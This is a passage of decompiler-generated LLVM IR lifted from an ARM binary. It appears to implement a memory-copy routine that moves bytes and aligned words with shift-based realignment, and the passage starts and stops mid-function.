  %v18_14b9c = add i32 %v0_14b80, 48
  store i32 %v18_14b9c, i32* %r0.global-to-local, align 4
  %v6_14ba0 = load i32, i32* %r2.global-to-local, align 4
  %v7_14ba0 = add i32 %v6_14ba0, -16
  store i32 %v7_14ba0, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14b94, %bb130
  %v3_14bb0102 = phi i32 [ %v12_14b88, %dec_label_pc_14b94 ], [ %v18_14b9c, %bb130 ]
  %v0_14ba896 = phi i32 [ %v2_14b8c, %dec_label_pc_14b94 ], [ %v7_14ba0, %bb130 ]
  %v2_14ba4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ba4, i32* @r4, align 4
  br label %dec_label_pc_14ba8

dec_label_pc_14ba8:                               ; preds = %dec_label_pc_14b70, %.thread2
  %v3_14bb0101 = phi i32 [ %v0_14b8093, %dec_label_pc_14b70 ], [ %v3_14bb0102, %.thread2 ]
  %v0_14ba8 = phi i32 [ %v2_14b70, %dec_label_pc_14b70 ], [ %v0_14ba896, %.thread2 ]
  %v1_14ba8 = add i32 %v0_14ba8, 20
  store i32 %v1_14ba8, i32* %r2.global-to-local, align 4
  %v3_14ba8 = sub i32 0, %v0_14ba8
  %v4_14ba8 = and i32 %v1_14ba8, %v3_14ba8
  %v5_14ba8 = icmp slt i32 %v4_14ba8, 0
  store i1 %v5_14ba8, i1* %cpsr_v.global-to-local, align 1
  %v6_14ba8 = icmp slt i32 %v1_14ba8, 0
  store i1 %v6_14ba8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14bac

dec_label_pc_14bac:                               ; preds = %.thread118, %dec_label_pc_14ba8
  %v0_14bbc.pre149 = phi i32 [ %v0_14bbc.pre, %.thread118 ], [ %v1_14ba8, %dec_label_pc_14ba8 ]
  %v3_14bb0 = phi i32 [ %v3_14bb099119, %.thread118 ], [ %v3_14bb0101, %dec_label_pc_14ba8 ]
  %v1_14bb4 = phi i1 [ %v1_14bb8, %.thread118 ], [ %v5_14ba8, %dec_label_pc_14ba8 ]
  %v0_14bb4 = phi i1 [ %v0_14bb8, %.thread118 ], [ %v6_14ba8, %dec_label_pc_14ba8 ]
  %v2_14bac = xor i1 %v1_14bb4, %v0_14bb4
  br i1 %v2_14bac, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_14bac
  %v3_14bac = load i32, i32* @r1, align 4
  %v4_14bac = inttoptr i32 %v3_14bac to i32*
  %v5_14bac = load i32, i32* %v4_14bac, align 4
  store i32 %v5_14bac, i32* %r3.global-to-local, align 4
  %v6_14bac = add i32 %v3_14bac, 4
  %v7_14bac = inttoptr i32 %v6_14bac to i32*
  %v8_14bac = load i32, i32* %v7_14bac, align 4
  store i32 %v8_14bac, i32* @ip, align 4
  %v9_14bac = add i32 %v3_14bac, 8
  %v10_14bac = inttoptr i32 %v9_14bac to i32*
  %v11_14bac = load i32, i32* %v10_14bac, align 4
  store i32 %v11_14bac, i32* @lr, align 4
  %v12_14bac = add i32 %v3_14bac, 12
  store i32 %v12_14bac, i32* @r1, align 4
  %v4_14bb0 = inttoptr i32 %v3_14bb0 to i32*
  store i32 %v5_14bac, i32* %v4_14bb0, align 4
  %v6_14bb0 = add i32 %v3_14bb0, 4
  %v7_14bb0 = inttoptr i32 %v6_14bb0 to i32*
  %v8_14bb0 = load i32, i32* @ip, align 4
  store i32 %v8_14bb0, i32* %v7_14bb0, align 4
  %v9_14bb0 = add i32 %v3_14bb0, 8
  %v10_14bb0 = inttoptr i32 %v9_14bb0 to i32*
  %v11_14bb0 = load i32, i32* @lr, align 4
  store i32 %v11_14bb0, i32* %v10_14bb0, align 4
  %v12_14bb0 = add i32 %v3_14bb0, 12
  store i32 %v12_14bb0, i32* %r0.global-to-local, align 4
  %v3_14bb4 = load i32, i32* %r2.global-to-local, align 4
  %v4_14bb4 = add i32 %v3_14bb4, -12
  store i32 %v4_14bb4, i32* %r2.global-to-local, align 4
  %v6_14bb4 = sub i32 11, %v3_14bb4
  %v7_14bb4 = and i32 %v6_14bb4, %v3_14bb4
  %v8_14bb4 = icmp slt i32 %v7_14bb4, 0
  store i1 %v8_14bb4, i1* %cpsr_v.global-to-local, align 1
  %v9_14bb4 = icmp slt i32 %v4_14bb4, 0
  store i1 %v9_14bb4, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_14bac, %bb131
  %v0_14bbc.pre = phi i32 [ %v4_14bb4, %bb131 ], [ %v0_14bbc.pre149, %dec_label_pc_14bac ]
  %v3_14bb099119 = phi i32 [ %v12_14bb0, %bb131 ], [ %v3_14bb0, %dec_label_pc_14bac ]
  %v1_14bb8 = phi i1 [ %v8_14bb4, %bb131 ], [ %v1_14bb4, %dec_label_pc_14bac ]
  %v0_14bb8 = phi i1 [ %v9_14bb4, %bb131 ], [ %v0_14bb4, %dec_label_pc_14bac ]
  %v2_14bb8 = xor i1 %v1_14bb8, %v0_14bb8
  br i1 %v2_14bb8, label %dec_label_pc_14bbc, label %dec_label_pc_14bac

dec_label_pc_14bbc:                               ; preds = %.thread118, %dec_label_pc_14b68
  %v7_14bcc = phi i32 [ %v0_14b8093, %dec_label_pc_14b68 ], [ %v3_14bb099119, %.thread118 ]
  %v0_14bbc = phi i32 [ %v2_14b68, %dec_label_pc_14b68 ], [ %v0_14bbc.pre, %.thread118 ]
  %v2_14bbc = add i32 %v0_14bbc, 8
  store i32 %v2_14bbc, i32* %r2.global-to-local, align 4
  %v4_14bbc = sub i32 0, %v0_14bbc
  %v5_14bbc = and i32 %v2_14bbc, %v4_14bbc
  %v6_14bbc = icmp slt i32 %v5_14bbc, 0
  store i1 %v6_14bbc, i1* %cpsr_v.global-to-local, align 1
  %v7_14bbc = icmp slt i32 %v2_14bbc, 0
  store i1 %v7_14bbc, i1* %cpsr_n.global-to-local, align 1
  %v5_14bc0 = icmp slt i32 %v0_14bbc, -8
  br i1 %v5_14bc0, label %bb133, label %dec_label_pc_14bc4

dec_label_pc_14bc4:                               ; preds = %dec_label_pc_14bbc
  %v6_14bc4 = add i32 %v0_14bbc, 4
  store i32 %v6_14bc4, i32* %r2.global-to-local, align 4
  %v8_14bc4 = sub i32 -5, %v0_14bbc
  %v9_14bc4 = and i32 %v8_14bc4, %v2_14bbc
  %v10_14bc4 = icmp slt i32 %v9_14bc4, 0
  store i1 %v10_14bc4, i1* %cpsr_v.global-to-local, align 1
  %v11_14bc4 = icmp slt i32 %v6_14bc4, 0
  store i1 %v11_14bc4, i1* %cpsr_n.global-to-local, align 1
  %v5_14bc8 = icmp slt i32 %v2_14bbc, 4
  %v6_14bc8 = load i32, i32* @r1, align 4
  %v7_14bc8 = inttoptr i32 %v6_14bc8 to i32*
  %v8_14bc8 = load i32, i32* %v7_14bc8, align 4
  store i32 %v8_14bc8, i32* %r3.global-to-local, align 4
  %v10_14bc8 = add i32 %v6_14bc8, 4
  br i1 %v5_14bc8, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_14bc4
  store i32 %v10_14bc8, i32* @r1, align 4
  %v8_14bcc = inttoptr i32 %v7_14bcc to i32*
  store i32 %v8_14bc8, i32* %v8_14bcc, align 4
  %v9_14bcc = load i32, i32* %r0.global-to-local, align 4
  %v10_14bcc = add i32 %v9_14bcc, 4
  store i32 %v10_14bcc, i32* %r0.global-to-local, align 4
  %v0_14bdc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_14bc4
  %v10_14bd0 = inttoptr i32 %v10_14bc8 to i32*
  %v11_14bd0 = load i32, i32* %v10_14bd0, align 4
  store i32 %v11_14bd0, i32* @ip, align 4
  %v12_14bd0 = add i32 %v6_14bc8, 8
  store i32 %v12_14bd0, i32* @r1, align 4
  %v7_14bd4 = inttoptr i32 %v7_14bcc to i32*
  store i32 %v8_14bc8, i32* %v7_14bd4, align 4
  %v9_14bd4 = add i32 %v7_14bcc, 4
  %v10_14bd4 = inttoptr i32 %v9_14bd4 to i32*
  %v11_14bd4 = load i32, i32* @ip, align 4
  store i32 %v11_14bd4, i32* %v10_14bd4, align 4
  %v12_14bd4 = add i32 %v7_14bcc, 8
  store i32 %v12_14bd4, i32* %r0.global-to-local, align 4
  %v6_14bd8 = load i32, i32* %r2.global-to-local, align 4
  %v7_14bd8 = add i32 %v6_14bd8, -4
  store i32 %v7_14bd8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_14bbc, %bb, %dec_label_pc_14d84, %dec_label_pc_14cac, %dec_label_pc_14d18, %bb132
  %v2_14bec = phi i32 [ %v10_14bcc, %.thread6 ], [ %v0_14c7c76, %.thread12 ], [ %v7_14bcc, %dec_label_pc_14bbc ], [ %v1_14b40, %bb ], [ %v2_14bec114, %dec_label_pc_14d84 ], [ %v2_14bec113, %dec_label_pc_14cac ], [ %v2_14bec112, %dec_label_pc_14d18 ], [ %v12_14bd4, %bb132 ]
  %v0_14bdc = phi i32 [ %v0_14bdc.pre, %.thread6 ], [ %v2_14c24, %.thread12 ], [ %v2_14bbc, %dec_label_pc_14bbc ], [ %v2_14b50, %bb ], [ %v0_14bdc110, %dec_label_pc_14d84 ], [ %v0_14bdc109, %dec_label_pc_14cac ], [ %v0_14bdc108, %dec_label_pc_14d18 ], [ %v7_14bd8, %bb132 ]
  %v1_14bdc = add i32 %v0_14bdc, 4
  store i32 %v1_14bdc, i32* @r2, align 4
  %v3_14bdc = sub i32 0, %v0_14bdc
  %v4_14bdc = and i32 %v1_14bdc, %v3_14bdc
  %v5_14bdc = icmp slt i32 %v4_14bdc, 0
  store i1 %v5_14bdc, i1* %cpsr_v.global-to-local, align 1
  %v6_14bdc = icmp slt i32 %v1_14bdc, 0
  store i1 %v6_14bdc, i1* %cpsr_n.global-to-local, align 1
  %v7_14bdc = icmp eq i32 %v1_14bdc, 0
  store i1 %v7_14bdc, i1* @cpsr_z, align 1
  br i1 %v7_14bdc, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_14be0 = load i8*, i8** %stack_var_-8, align 4
  %v4_14be0 = ptrtoint i8* %v3_14be0 to i32
  store i32 %v4_14be0, i32* %r0.global-to-local, align 4
  ret i32 %v4_14be0

bb135:                                            ; preds = %bb133
  %v1_14be4 = add i32 %v0_14bdc, 2
  %v3_14be4 = sub i32 -3, %v0_14bdc
  %v4_14be4 = and i32 %v3_14be4, %v1_14bdc
  %v5_14be4 = icmp slt i32 %v4_14be4, 0
  store i1 %v5_14be4, i1* %cpsr_v.global-to-local, align 1
  %v6_14be4 = icmp slt i32 %v1_14be4, 0
  store i1 %v6_14be4, i1* %cpsr_n.global-to-local, align 1
  %v7_14be4 = icmp eq i32 %v1_14bdc, 2
  store i1 %v7_14be4, i1* @cpsr_z, align 1
  %v0_14be8 = load i32, i32* @r1, align 4
  %v1_14be8 = inttoptr i32 %v0_14be8 to i8*
  %v2_14be8 = load i8, i8* %v1_14be8, align 1
  %v3_14be8 = zext i8 %v2_14be8 to i32
  store i32 %v3_14be8, i32* %r3.global-to-local, align 4
  %v5_14be8 = add i32 %v0_14be8, 1
  store i32 %v5_14be8, i32* @r1, align 4
  %v3_14bec = inttoptr i32 %v2_14bec to i8*
  store i8 %v2_14be8, i8* %v3_14bec, align 1
  %v4_14bec = load i32, i32* %r0.global-to-local, align 4
  %v5_14bec = add i32 %v4_14bec, 1
  store i32 %v5_14bec, i32* %r0.global-to-local, align 4
  %v0_14bf0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14bf0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14bf0 = xor i1 %v0_14bf0, %v1_14bf0
  br i1 %v2_14bf0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_14bf0 = load i32, i32* @r1, align 4
  %v4_14bf0 = inttoptr i32 %v3_14bf0 to i8*
  %v5_14bf0 = load i8, i8* %v4_14bf0, align 1
  %v6_14bf0 = zext i8 %v5_14bf0 to i32
  store i32 %v6_14bf0, i32* %r3.global-to-local, align 4
  %v8_14bf0 = add i32 %v3_14bf0, 1
  store i32 %v8_14bf0, i32* @r1, align 4
  %v6_14bf4 = inttoptr i32 %v5_14bec to i8*
  store i8 %v5_14bf0, i8* %v6_14bf4, align 1
  %v7_14bf4 = load i32, i32* %r0.global-to-local, align 4
  %v8_14bf4 = add i32 %v7_14bf4, 1
  store i32 %v8_14bf4, i32* %r0.global-to-local, align 4
  %v1_14bf8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14bf8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_14bfc = phi i32 [ %v8_14bf4, %bb136 ], [ %v5_14bec, %bb135 ]
  %v2_14bfc = phi i1 [ %v2_14bf8.pre, %bb136 ], [ %v1_14bf0, %bb135 ]
  %v1_14bfc = phi i1 [ %v1_14bf8.pre, %bb136 ], [ %v0_14bf0, %bb135 ]
  %v0_14bf8 = load i1, i1* @cpsr_z, align 1
  %v3_14bf8 = xor i1 %v2_14bfc, %v1_14bfc
  %v4_14bf8 = or i1 %v0_14bf8, %v3_14bf8
  br i1 %v4_14bf8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_14bf8 = load i32, i32* @r1, align 4
  %v6_14bf8 = inttoptr i32 %v5_14bf8 to i8*
  %v7_14bf8 = load i8, i8* %v6_14bf8, align 1
  %v8_14bf8 = zext i8 %v7_14bf8 to i32
  store i32 %v8_14bf8, i32* %r3.global-to-local, align 4
  %v10_14bf8 = add i32 %v5_14bf8, 1
  store i32 %v10_14bf8, i32* @r1, align 4
  %v8_14bfc = inttoptr i32 %v7_14bfc to i8*
  store i8 %v7_14bf8, i8* %v8_14bfc, align 1
  %v9_14bfc = load i32, i32* %r0.global-to-local, align 4
  %v10_14bfc = add i32 %v9_14bfc, 1
  store i32 %v10_14bfc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_14c00 = load i8*, i8** %stack_var_-8, align 4
  %v3_14c00 = ptrtoint i8* %v2_14c00 to i32
  store i32 %v3_14c00, i32* %r0.global-to-local, align 4
  ret i32 %v3_14c00

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14b58
  %v1_14c04 = sub nsw i32 4, %v1_14b58
  store i32 %v1_14c04, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14c08 = icmp ult i32 %v1_14c04, 2
  store i1 %v8_14c08, i1* %cpsr_n.global-to-local, align 1
  %v1_14c0c = inttoptr i32 %v0_14b40 to i8*
  %v2_14c0c = load i8, i8* %v1_14c0c, align 1
  %v3_14c0c = zext i8 %v2_14c0c to i32
  store i32 %v3_14c0c, i32* %r3.global-to-local, align 4
  %v5_14c0c = add i32 %v0_14b40, 1
  store i32 %v5_14c0c, i32* @r1, align 4
  store i8 %v2_14c0c, i8* %v5_14b4c, align 1
  %v4_14c10 = load i32, i32* %r0.global-to-local, align 4
  %v5_14c10 = add i32 %v4_14c10, 1
  store i32 %v5_14c10, i32* %r0.global-to-local, align 4
  br i1 %v8_14c08, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_14c04
  %v9_14c08 = icmp eq i32 %v1_14c04, 2
  %v6_14c14 = load i32, i32* @r1, align 4
  %v7_14c14 = inttoptr i32 %v6_14c14 to i8*
  %v8_14c14 = load i8, i8* %v7_14c14, align 1
  %v9_14c14 = zext i8 %v8_14c14 to i32
  store i32 %v9_14c14, i32* %r3.global-to-local, align 4
  %v11_14c14 = add i32 %v6_14c14, 1
  store i32 %v11_14c14, i32* @r1, align 4
  %v9_14c18 = inttoptr i32 %v5_14c10 to i8*
  store i8 %v8_14c14, i8* %v9_14c18, align 1
  %v10_14c18 = load i32, i32* %r0.global-to-local, align 4
  %v11_14c18 = add i32 %v10_14c18, 1
  store i32 %v11_14c18, i32* %r0.global-to-local, align 4
  br i1 %v9_14c08, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_14c1c = load i32, i32* @r1, align 4
  %v9_14c1c = inttoptr i32 %v8_14c1c to i8*
  %v10_14c1c = load i8, i8* %v9_14c1c, align 1
  %v11_14c1c = zext i8 %v10_14c1c to i32
  store i32 %v11_14c1c, i32* %r3.global-to-local, align 4
  %v13_14c1c = add i32 %v8_14c1c, 1
  store i32 %v13_14c1c, i32* @r1, align 4
  %v11_14c20 = inttoptr i32 %v11_14c18 to i8*
  store i8 %v10_14c1c, i8* %v11_14c20, align 1
  %v12_14c20 = load i32, i32* %r0.global-to-local, align 4
  %v13_14c20 = add i32 %v12_14c20, 1
  store i32 %v13_14c20, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_14c04, %bb139
  %v0_14c7c76 = phi i32 [ %v11_14c18, %bb138 ], [ %v5_14c10, %dec_label_pc_14c04 ], [ %v13_14c20, %bb139 ]
  %v0_14c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c24 = load i32, i32* @ip, align 4
  %v2_14c24 = sub i32 %v0_14c24, %v1_14c24
  store i32 %v2_14c24, i32* %r2.global-to-local, align 4
  %v4_14c24 = xor i32 %v1_14c24, %v0_14c24
  %v5_14c24 = xor i32 %v2_14c24, %v0_14c24
  %v6_14c24 = and i32 %v5_14c24, %v4_14c24
  %v7_14c24 = icmp slt i32 %v6_14c24, 0
  store i1 %v7_14c24, i1* %cpsr_v.global-to-local, align 1
  %v8_14c24 = icmp slt i32 %v2_14c24, 0
  store i1 %v8_14c24, i1* %cpsr_n.global-to-local, align 1
  %v5_14c28 = icmp slt i32 %v0_14c24, %v1_14c24
  br i1 %v5_14c28, label %bb133, label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %.thread12
  %v0_14c2c = load i32, i32* @r1, align 4
  %v1_14c2c = urem i32 %v0_14c2c, 4
  store i32 %v1_14c2c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14c2c = icmp eq i32 %v1_14c2c, 0
  %extract.t124 = trunc i32 %v0_14c2c to i2
  br i1 %v2_14c2c, label %dec_label_pc_14b68, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14b60, %dec_label_pc_14c2c
  %v0_14c7c75 = phi i32 [ %v1_14b40, %dec_label_pc_14b60 ], [ %v0_14c7c76, %dec_label_pc_14c2c ]
  %v0_14d28 = phi i32 [ %v2_14b50, %dec_label_pc_14b60 ], [ %v2_14c24, %dec_label_pc_14c2c ]
  %v0_14c3c.off0 = phi i2 [ %extract.t, %dec_label_pc_14b60 ], [ %extract.t124, %dec_label_pc_14c2c ]
  %v0_14c34 = phi i32 [ %v0_14b40, %dec_label_pc_14b60 ], [ %v0_14c2c, %dec_label_pc_14c2c ]
  %v1_14c34 = and i32 %v0_14c34, -4
  store i32 %v1_14c34, i32* %r1.global-to-local, align 4
  %v1_14c38 = inttoptr i32 %v1_14c34 to i32*
  %v2_14c38 = load i32, i32* %v1_14c38, align 4
  store i32 %v2_14c38, i32* @lr, align 4
  %v4_14c38 = add i32 %v1_14c34, 4
  store i32 %v4_14c38, i32* %r1.global-to-local, align 4
  %v2_14d20 = add i32 %v0_14d28, -12
  %v4_14d20 = sub i32 11, %v0_14d28
  %v5_14d20 = and i32 %v4_14d20, %v0_14d28
  %v6_14d20 = icmp slt i32 %v5_14d20, 0
  store i1 %v6_14d20, i1* %cpsr_v.global-to-local, align 1
  %v7_14d20 = icmp slt i32 %v2_14d20, 0
  store i1 %v7_14d20, i1* %cpsr_n.global-to-local, align 1
  %v5_14d24 = icmp slt i32 %v0_14d28, 12
  switch i2 %v0_14c3c.off0, label %dec_label_pc_14c48 [
    i2 -1, label %dec_label_pc_14d20
    i2 -2, label %dec_label_pc_14cb4
  ]

dec_label_pc_14c48:                               ; preds = %dec_label_pc_14c34
  br i1 %v5_14d24, label %dec_label_pc_14c94, label %dec_label_pc_14c50

dec_label_pc_14c50:                               ; preds = %dec_label_pc_14c48
  store i32 %v2_14d20, i32* %r2.global-to-local, align 4
  %v3_14c54 = load i32, i32* @r4, align 4
  store i32 %v3_14c54, i32* %stack_var_-16, align 4
  %v6_14c54 = load i32, i32* @r5, align 4
  store i32 %v6_14c54, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c58.dec_label_pc_14c58_crit_edge, %dec_label_pc_14c50
  %v0_14c7c = phi i32 [ %v12_14c7c, %dec_label_pc_14c58.dec_label_pc_14c58_crit_edge ], [ %v0_14c7c75, %dec_label_pc_14c50 ]
  %v0_14c5c = phi i32 [ %v0_14c5c.pre, %dec_label_pc_14c58.dec_label_pc_14c58_crit_edge ], [ %v4_14c38, %dec_label_pc_14c50 ]
  %v0_14c58 = phi i32 [ %v0_14c58.pre, %dec_label_pc_14c58.dec_label_pc_14c58_crit_edge ], [ %v2_14c38, %dec_label_pc_14c50 ]
  %v3_14c58 = udiv i32 %v0_14c58, 256
  store i32 %v3_14c58, i32* %r3.global-to-local, align 4
  %v1_14c5c = inttoptr i32 %v0_14c5c to i32*
  %v2_14c5c = load i32, i32* %v1_14c5c, align 4
  store i32 %v2_14c5c, i32* %r4.global-to-local, align 4
  %v3_14c5c = add i32 %v0_14c5c, 4
  %v4_14c5c = inttoptr i32 %v3_14c5c to i32*
  %v5_14c5c = load i32, i32* %v4_14c5c, align 4
  store i32 %v5_14c5c, i32* %r5.global-to-local, align 4
  %v6_14c5c = add i32 %v0_14c5c, 8
  %v7_14c5c = inttoptr i32 %v6_14c5c to i32*
  %v8_14c5c = load i32, i32* %v7_14c5c, align 4
  store i32 %v8_14c5c, i32* %ip.global-to-local, align 4
  %v9_14c5c = add i32 %v0_14c5c, 12
  %v10_14c5c = inttoptr i32 %v9_14c5c to i32*
  %v11_14c5c = load i32, i32* %v10_14c5c, align 4
  store i32 %v11_14c5c, i32* @lr, align 4
  %v12_14c5c = add i32 %v0_14c5c, 16
  store i32 %v12_14c5c, i32* %r1.global-to-local, align 4
  %v4_14c60 = mul i32 %v2_14c5c, 16777216
  %v5_14c60 = or i32 %v4_14c60, %v3_14c58
  store i32 %v5_14c60, i32* %r3.global-to-local, align 4
  %v3_14c64 = udiv i32 %v2_14c5c, 256
  %v4_14c68 = mul i32 %v5_14c5c, 16777216
  %v5_14c68 = or i32 %v4_14c68, %v3_14c64
  store i32 %v5_14c68, i32* %r4.global-to-local, align 4
  %v3_14c6c = udiv i32 %v5_14c5c, 256
  %v4_14c70 = mul i32 %v8_14c5c, 16777216
  %v5_14c70 = or i32 %v4_14c70, %v3_14c6c
  store i32 %v5_14c70, i32* %r5.global-to-local, align 4
  %v3_14c74 = udiv i32 %v8_14c5c, 256
  %v4_14c78 = mul i32 %v11_14c5c, 16777216
  %v5_14c78 = or i32 %v4_14c78, %v3_14c74
  store i32 %v5_14c78, i32* @ip, align 4
  %v1_14c7c = inttoptr i32 %v0_14c7c to i32*
  store i32 %v5_14c60, i32* %v1_14c7c, align 4
  %v3_14c7c = add i32 %v0_14c7c, 4
  %v4_14c7c = inttoptr i32 %v3_14c7c to i32*
  %v5_14c7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14c7c, i32* %v4_14c7c, align 4
  %v6_14c7c = add i32 %v0_14c7c, 8
  %v7_14c7c = inttoptr i32 %v6_14c7c to i32*
  %v8_14c7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14c7c, i32* %v7_14c7c, align 4
  %v9_14c7c = add i32 %v0_14c7c, 12
  %v10_14c7c = inttoptr i32 %v9_14c7c to i32*
  %v11_14c7c = load i32, i32* @ip, align 4
  store i32 %v11_14c7c, i32* %v10_14c7c, align 4
  %v12_14c7c = add i32 %v0_14c7c, 16
  store i32 %v12_14c7c, i32* %r0.global-to-local, align 4
  %v0_14c80 = load i32, i32* %r2.global-to-local, align 4
  %v2_14c80 = add i32 %v0_14c80, -16
  store i32 %v2_14c80, i32* %r2.global-to-local, align 4
  %v6_14c84 = icmp slt i32 %v0_14c80, 16
  br i1 %v6_14c84, label %dec_label_pc_14c88, label %dec_label_pc_14c58.dec_label_pc_14c58_crit_edge

dec_label_pc_14c58.dec_label_pc_14c58_crit_edge:  ; preds = %dec_label_pc_14c58
  %v0_14c58.pre = load i32, i32* @lr, align 4
  %v0_14c5c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14c58

dec_label_pc_14c88:                               ; preds = %dec_label_pc_14c58
  %v2_14c88 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14c88, i32* @r4, align 4
  %v5_14c88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14c88, i32* @r5, align 4
  %v2_14c8c = add i32 %v0_14c80, -4
  store i32 %v2_14c8c, i32* %r2.global-to-local, align 4
  %v4_14c8c = add i32 %v0_14c80, 2147483632
  %v5_14c8c = and i32 %v2_14c8c, %v4_14c8c
  %v6_14c8c = icmp slt i32 %v5_14c8c, 0
  store i1 %v6_14c8c, i1* %cpsr_v.global-to-local, align 1
  %v7_14c8c = icmp slt i32 %v2_14c8c, 0
  store i1 %v7_14c8c, i1* %cpsr_n.global-to-local, align 1
  %v5_14c90 = icmp slt i32 %v2_14c80, -12
  br i1 %v5_14c90, label %dec_label_pc_14cac, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c88, %dec_label_pc_14c48, %dec_label_pc_14c94
  %v1_14ca0 = phi i32 [ %v4_14ca0, %dec_label_pc_14c94 ], [ %v12_14c7c, %dec_label_pc_14c88 ], [ %v0_14c7c75, %dec_label_pc_14c48 ]
  %v0_14c94 = load i32, i32* @lr, align 4
  %v3_14c94 = udiv i32 %v0_14c94, 256
  store i32 %v3_14c94, i32* %ip.global-to-local, align 4
  %v0_14c98 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c98 = inttoptr i32 %v0_14c98 to i32*
  %v2_14c98 = load i32, i32* %v1_14c98, align 4
  store i32 %v2_14c98, i32* @lr, align 4
  %v4_14c98 = add i32 %v0_14c98, 4
  store i32 %v4_14c98, i32* %r1.global-to-local, align 4
  %v4_14c9c = mul i32 %v2_14c98, 16777216
  %v5_14c9c = or i32 %v4_14c9c, %v3_14c94
  store i32 %v5_14c9c, i32* @ip, align 4
  %v2_14ca0 = inttoptr i32 %v1_14ca0 to i32*
  store i32 %v5_14c9c, i32* %v2_14ca0, align 4
  %v3_14ca0 = load i32, i32* %r0.global-to-local, align 4
  %v4_14ca0 = add i32 %v3_14ca0, 4
  store i32 %v4_14ca0, i32* %r0.global-to-local, align 4
  %v0_14ca4 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ca4 = add i32 %v0_14ca4, -4
  store i32 %v2_14ca4, i32* %r2.global-to-local, align 4
  %v6_14ca8 = icmp slt i32 %v0_14ca4, 4
  br i1 %v6_14ca8, label %dec_label_pc_14cac.loopexit, label %dec_label_pc_14c94

dec_label_pc_14cac.loopexit:                      ; preds = %dec_label_pc_14c94
  %v4_14ca4 = sub i32 3, %v0_14ca4
  %v5_14ca4 = and i32 %v4_14ca4, %v0_14ca4
  %v6_14ca4 = icmp slt i32 %v5_14ca4, 0
  %v7_14ca4 = icmp slt i32 %v2_14ca4, 0
  store i1 %v6_14ca4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14ca4, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %dec_label_pc_14cac.loopexit, %dec_label_pc_14c88
  %v2_14bec113 = phi i32 [ %v4_14ca0, %dec_label_pc_14cac.loopexit ], [ %v12_14c7c, %dec_label_pc_14c88 ]
  %v0_14bdc109 = phi i32 [ %v2_14ca4, %dec_label_pc_14cac.loopexit ], [ %v2_14c8c, %dec_label_pc_14c88 ]
  %v0_14cac = load i32, i32* %r1.global-to-local, align 4
  %v1_14cac = add i32 %v0_14cac, -3
  store i32 %v1_14cac, i32* @r1, align 4
  br label %bb133

dec_label_pc_14cb4:                               ; preds = %dec_label_pc_14c34
  br i1 %v5_14d24, label %dec_label_pc_14d00, label %dec_label_pc_14cbc

dec_label_pc_14cbc:                               ; preds = %dec_label_pc_14cb4
  store i32 %v2_14d20, i32* %r2.global-to-local, align 4
  %v3_14cc0 = load i32, i32* @r4, align 4
  store i32 %v3_14cc0, i32* %stack_var_-16, align 4
  %v6_14cc0 = load i32, i32* @r5, align 4
  store i32 %v6_14cc0, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge, %dec_label_pc_14cbc
  %v0_14ce8 = phi i32 [ %v12_14ce8, %dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge ], [ %v0_14c7c75, %dec_label_pc_14cbc ]
  %v0_14cc8 = phi i32 [ %v0_14cc8.pre, %dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge ], [ %v4_14c38, %dec_label_pc_14cbc ]
  %v0_14cc4 = phi i32 [ %v0_14cc4.pre, %dec_label_pc_14cc4.dec_label_pc_14cc4_crit_edge ], [ %v2_14c38, %dec_label_pc_14cbc ]
  %v3_14cc4 = udiv i32 %v0_14cc4, 65536
  store i32 %v3_14cc4, i32* %r3.global-to-local, align 4
  %v1_14cc8 = inttoptr i32 %v0_14cc8 to i32*
  %v2_14cc8 = load i32, i32* %v1_14cc8, align 4
  store i32 %v2_14cc8, i32* %r4.global-to-local, align 4
  %v3_14cc8 = add i32 %v0_14cc8, 4
